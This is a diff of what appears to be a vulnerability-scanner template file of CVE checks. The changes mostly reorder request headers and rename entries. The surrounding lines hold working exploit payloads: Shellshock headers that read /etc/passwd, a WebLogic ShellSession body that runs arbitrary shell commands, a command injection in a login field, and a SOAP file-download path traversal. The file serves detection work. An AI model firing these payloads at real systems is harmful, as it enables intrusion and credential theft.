@@ -3292,9 +3292,9 @@
       "requests": [
         {
           "headers": {
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -9754,8 +9754,8 @@
         {
           "body": "test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(\"connectionHandler\");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(\"getServletRequest\").invoke(obj); String cmd = req.getHeader(\"Test-Header\");String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", cmd} : new String[]{\"/bin/sh\", \"-c\", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(\"\\\\A\").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(\"getResponse\").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();')\n",
           "headers": {
-            "Test-Header": "cat /etc/passwd",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Test-Header": "cat /etc/passwd"
           },
           "method": "POST",
           "path": [
@@ -10250,8 +10250,8 @@
         {
           "body": "op=login&username=;`cat /etc/passwd`&password=\n",
           "headers": {
-            "Referer": "{{Hostname}}/module/login/login.html",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Referer": "{{Hostname}}/module/login/login.html"
           },
           "method": "POST",
           "path": [
@@ -10309,7 +10309,7 @@
     {
       "id": "CVE-2020-23517",
       "info": {
-        "name": "Aryanic HighMail (High CMS) XSS",
+        "name": "Aryanic HighMail (High CMS) Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -10635,9 +10635,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
-            "content-type": "text/xml",
             "Cookie": "Login",
-            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile"
+            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
+            "content-type": "text/xml"
           },
           "method": "POST",
           "path": [
@@ -15063,7 +15063,7 @@
     {
       "id": "CVE-2021-40323",
       "info": {
-        "name": "Cobbler before 3.3.0 allows log poisoning, and resultant Remote Code Execution, via an XMLRPC method",
+        "name": "Cobbler <3.3.0 Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -15093,7 +15093,7 @@
     {
       "id": "CVE-2021-40539",
       "info": {
-        "name": "ManageEngine ADSelfService Plus version 6113 Unauthenticated RCE",
+        "name": "Zoho ManageEngine ADSelfService Plus version 6113 Unauthenticated RCE",
         "severity": "critical"
       },
       "requests": [
@@ -15110,7 +15110,7 @@
     {
       "id": "CVE-2021-40542",
       "info": {
-        "name": "Opensis-Classic 8.0 Reflected XSS",
+        "name": "Opensis-Classic 8.0 Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15139,7 +15139,7 @@
     {
       "id": "CVE-2021-40859",
       "info": {
-        "name": "Auerswald COMpact 5500R 7.8A and 8.0B devices Backdoor",
+        "name": "Auerswald COMpact 5500R 7.8A and 8.0B Devices Backdoor",
         "severity": "critical"
       },
       "requests": [
